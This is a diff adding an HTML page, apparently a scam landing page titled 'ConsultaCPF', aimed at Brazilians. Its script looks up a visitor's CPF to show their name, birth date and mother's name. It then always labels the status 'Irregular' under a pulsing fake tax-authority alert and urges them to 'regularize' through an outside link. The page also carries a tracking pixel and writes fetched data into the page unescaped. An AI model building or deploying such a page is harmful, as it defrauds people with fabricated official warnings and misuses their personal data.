@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pendências Identificadas - ConsultaCPF</title>
+    <!-- UTMify Pixel -->
+    <script>
+      window.pixelId = "691e4e1d6076486a2bdde991";
+      var a = document.createElement("script");
+      a.setAttribute("async", "");
+      a.setAttribute("defer", "");
+      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+      document.head.appendChild(a);
+    </script>
+
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0c326f 0%, #1e4a9e 100%);
+            color: #1e293b;
+            line-height: 1.6;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .header {
+            background: #0c326f;
+            padding: 16px 20px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            color: white;
+            font-size: 1.5rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo i {
+            color: #22C55E;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 100px auto 40px;
+        }
+
+        .alert-card {
+            background: #fee2e2;
+            border: 3px solid #ef4444;
+            border-radius: 16px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 30px rgba(239, 68, 68, 0.3);
+            animation: alertPulse 2s ease-in-out infinite, slideInDown 0.6s ease-out;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .alert-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(239, 68, 68, 0.1), transparent);
+            animation: shimmer 3s infinite;
+        }
+
+        @keyframes alertPulse {
+            0%, 100% {
+                box-shadow: 0 10px 30px rgba(239, 68, 68, 0.3);
+                transform: scale(1);
+            }
+            50% {
+                box-shadow: 0 10px 40px rgba(239, 68, 68, 0.5);
+                transform: scale(1.01);
+            }
+        }
+
+        @keyframes shimmer {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        @keyframes slideInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .alert-title {
+            color: #dc2626;
+            font-size: 1.8rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            animation: shake 0.5s ease-in-out 0.6s;
+            position: relative;
+            z-index: 1;
+        }
+
+        .alert-title i {
+            font-size: 2rem;
+            animation: warningBlink 1.5s ease-in-out infinite;
+        }
+
+        @keyframes warningBlink {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.7; transform: scale(1.1); }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .alert-message {
+            color: #991b1b;
+            font-size: 1.1rem;
+            line-height: 1.8;
+            font-weight: 600;
+            position: relative;
+            z-index: 1;
+        }
+
+        .data-card {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+            animation: slideInUp 0.6s ease-out;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .data-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 50px rgba(0,0,0,0.25);
+        }
+
+        @keyframes slideInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .data-card h2 {
+            color: #0c326f;
+            font-size: 1.5rem;
+            margin-bottom: 25px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .data-card h2 i {
+            color: #3b82f6;
+            animation: iconBounce 2s ease-in-out infinite;
+        }
+
+        @keyframes iconBounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-3px); }
+        }
+
+        .data-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 20px;
+        }
+
+        @media (min-width: 640px) {
+            .data-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        .data-item {
+            padding: 15px;
+            background: #f8fafc;
+            border-radius: 8px;
+            border-left: 4px solid #3b82f6;
+            transition: all 0.3s ease;
+            animation: fadeInScale 0.5s ease-out forwards;
+            opacity: 0;
+            transform: scale(0.95);
+        }
+
+        .data-item:hover {
+            transform: translateX(5px) scale(1.02);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+        }
+
+        @keyframes fadeInScale {
+            to {
+                opacity: 1;
+                transform: scale(1);
+            }
+        }
+
+        .data-label {
+            color: #64748b;
+            font-size: 0.9rem;
+            font-weight: 600;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .data-label i {
+            color: #3b82f6;
+            font-size: 1rem;
+            transition: transform 0.3s ease;
+        }
+
+        .data-item:hover .data-label i {
+            transform: rotate(10deg) scale(1.1);
+        }
+
+        .data-value {
+            color: #1e293b;
+            font-size: 1.1rem;
+            font-weight: 700;
+            transition: color 0.3s ease;
+        }
+
+        .data-item.irregular {
+            border-left-color: #ef4444;
+            background: #fef2f2;
+            animation: irregularPulse 2s ease-in-out infinite, fadeInScale 0.5s ease-out forwards;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .data-item.irregular::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(239, 68, 68, 0.2), transparent);
+            animation: irregularShine 3s infinite;
+        }
+
+        @keyframes irregularPulse {
+            0%, 100% {
+                box-shadow: 0 0 0 0 rgba(239, 68, 68, 0.4);
+                border-left-width: 4px;
+            }
+            50% {
+                box-shadow: 0 0 0 8px rgba(239, 68, 68, 0);
+                border-left-width: 6px;
+            }
+        }
+
+        @keyframes irregularShine {
+            0% { left: -100%; }
+            100% { left: 100%; }
+        }
+
+        .data-item.irregular .data-label {
+            color: #dc2626;
+        }
+
+        .data-item.irregular .data-label i {
+            color: #ef4444;
+            animation: warningIconPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes warningIconPulse {
+            0%, 100% { 
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% { 
+                transform: scale(1.2);
+                opacity: 0.8;
+            }
+        }
+
+        .data-item.irregular .data-value {
+            color: #dc2626;
+            font-weight: 800;
+            animation: textPulse 1.5s ease-in-out infinite;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        @keyframes textPulse {
+            0%, 100% { 
+                transform: scale(1);
+            }
+            50% { 
+                transform: scale(1.05);
+            }
+        }
+
+        .data-item.irregular:hover {
+            transform: translateX(5px) scale(1.05);
+            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
+        }
+
+        .regularize-btn {
+            width: 100%;
+            padding: 20px;
+            background: linear-gradient(90deg, #dc2626 0%, #ef4444 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 20px rgba(239, 68, 68, 0.4);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin-top: 30px;
+            animation: buttonPulse 2s ease-in-out infinite, slideInUp 0.8s ease-out;
+            position: relative;
+            overflow: hidden;
+            text-decoration: none;
+        }
+
+        .regularize-btn::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.2), transparent);
+            animation: buttonShine 3s infinite;
+        }
+
+        @keyframes buttonPulse {
+            0%, 100% {
+                box-shadow: 0 5px 20px rgba(239, 68, 68, 0.4);
+                transform: scale(1);
+            }
+            50% {
+                box-shadow: 0 8px 35px rgba(239, 68, 68, 0.7);
+                transform: scale(1.02);
+            }
+        }
+
+        @keyframes buttonShine {
+            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+        }
+
+        .regularize-btn:hover {
+            background: linear-gradient(90deg, #b91c1c 0%, #dc2626 100%);
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 12px 40px rgba(239, 68, 68, 0.8);
+            animation: none;
+        }
+
+        .regularize-btn:active {
+            transform: translateY(-2px) scale(1.02);
+        }
+
+        .regularize-btn i {
+            transition: transform 0.3s ease;
+            position: relative;
+            z-index: 1;
+        }
+
+        .regularize-btn:hover i {
+            transform: scale(1.2) rotate(5deg);
+        }
+
+        .loading {
+            text-align: center;
+            padding: 60px 20px;
+            color: white;
+        }
+
+        .loading i {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .error-message {
+            background: #fee2e2;
+            border: 2px solid #ef4444;
+            border-radius: 12px;
+            padding: 30px;
+            text-align: center;
+            color: #dc2626;
+            margin: 40px 20px;
+        }
+
+        @media (max-width: 640px) {
+            .container {
+                margin-top: 80px;
+            }
+
+            .alert-card {
+                padding: 20px;
+                animation: alertPulse 2s ease-in-out infinite, slideInDown 0.5s ease-out;
+            }
+
+            .alert-title {
+                font-size: 1.4rem;
+            }
+
+            .alert-title i {
+                font-size: 1.5rem;
+            }
+
+            .alert-message {
+                font-size: 1rem;
+            }
+
+            .data-card {
+                padding: 20px;
+            }
+
+            .data-card h2 {
+                font-size: 1.2rem;
+            }
+
+            .data-item {
+                padding: 12px;
+            }
+
+            .data-value {
+                font-size: 1rem;
+            }
+
+            .regularize-btn {
+                padding: 18px;
+                font-size: 1.15rem;
+            }
+
+            .regularize-btn:hover {
+                transform: translateY(-3px) scale(1.03);
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <i class="fas fa-shield-halved"></i>
+                ConsultaCPF
+            </div>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- Loading State -->
+        <div class="loading" id="loadingState">
+            <i class="fas fa-spinner"></i>
+            <p>Carregando informações...</p>
+        </div>
+
+        <!-- Error State -->
+        <div class="error-message" id="errorState" style="display: none;">
+            <i class="fas fa-exclamation-circle" style="font-size: 3rem; margin-bottom: 15px;"></i>
+            <h2>Erro ao carregar dados</h2>
+            <p id="errorText"></p>
+        </div>
+
+        <!-- Content -->
+        <div id="content" style="display: none;">
+            <!-- Alert Card -->
+            <div class="alert-card">
+                <h1 class="alert-title">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    Pendências identificadas no orgão fiscal:
+                </h1>
+                <p class="alert-message">
+                    Alerta de Risco: Seu CPF apresenta irregularidades que podem restringir o uso de serviços financeiros, incluindo transferências. Verifique a situação atualizada em 19/12/2025 e regularize imediatamente.
+                </p>
+            </div>
+
+            <!-- Data Cards -->
+            <div class="data-card">
+                <h2><i class="fas fa-user"></i> Dados Pessoais</h2>
+                <div class="data-grid" id="personalData">
+                    <!-- Dados serão inseridos aqui -->
+                </div>
+            </div>
+
+            <!-- Regularize Button -->
+            <a href="https://meulink.com" class="regularize-btn" id="regularizeBtn">
+                <i class="fas fa-shield-alt"></i>
+                Regularizar meu CPF
+            </a>
+        </div>
+    </div>
+
+    <script>
+        // Obter CPF da URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const cpf = urlParams.get('cpf');
+
+        if (!cpf) {
+            document.getElementById('loadingState').style.display = 'none';
+            document.getElementById('errorState').style.display = 'block';
+            document.getElementById('errorText').textContent = 'CPF não informado na URL.';
+            throw new Error('CPF não fornecido');
+        }
+
+        // Buscar dados do CPF
+        async function loadData() {
+            try {
+                const cleanCPF = cpf.replace(/\D/g, '');
+                const response = await fetch(`get-cpf.php?cpf=${cleanCPF}`);
+                
+                if (!response.ok) {
+                    throw new Error('Erro ao buscar dados');
+                }
+
+                const data = await response.json();
+
+                if (data.error) {
+                    throw new Error(data.error);
+                }
+
+                // Exibir dados
+                displayData(data, cleanCPF);
+                
+                // Ocultar loading e mostrar conteúdo com animação
+                document.getElementById('loadingState').style.display = 'none';
+                const content = document.getElementById('content');
+                content.style.display = 'block';
+                
+                // Forçar reflow para garantir animação
+                void content.offsetWidth;
+
+            } catch (error) {
+                console.error('Erro:', error);
+                document.getElementById('loadingState').style.display = 'none';
+                document.getElementById('errorState').style.display = 'block';
+                document.getElementById('errorText').textContent = error.message || 'Erro ao carregar os dados. Por favor, tente novamente.';
+            }
+        }
+
+        function displayData(data, cpf) {
+            const formattedCPF = cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, '$1.$2.$3-$4');
+
+            // Dados pessoais apenas
+            const items = [
+                { icon: 'fas fa-id-card', label: 'Nome Completo', value: data.nome || 'Não informado', delay: 0 },
+                { icon: 'fas fa-calendar', label: 'Data de Nascimento', value: data.nascimento || 'Não informado', delay: 0.1 },
+                { icon: 'fas fa-fingerprint', label: 'CPF', value: formattedCPF, delay: 0.2 },
+                { icon: 'fas fa-user-female', label: 'Nome da Mãe', value: data.mae || 'Não informado', delay: 0.3 },
+                { icon: 'fas fa-exclamation-triangle', label: 'Status Cadastral', value: 'Irregular', delay: 0.4, irregular: true }
+            ];
+
+            let personalDataHTML = '';
+            items.forEach((item, index) => {
+                const irregularClass = item.irregular ? 'irregular' : '';
+                personalDataHTML += `
+                    <div class="data-item ${irregularClass}" style="animation-delay: ${item.delay}s">
+                        <div class="data-label"><i class="${item.icon}"></i> ${item.label}</div>
+                        <div class="data-value">${item.value}</div>
+                    </div>
+                `;
+            });
+
+            document.getElementById('personalData').innerHTML = personalDataHTML;
+        }
+
+        // Carregar dados ao carregar a página
+        loadData();
+    </script>
+</body>
+</html>
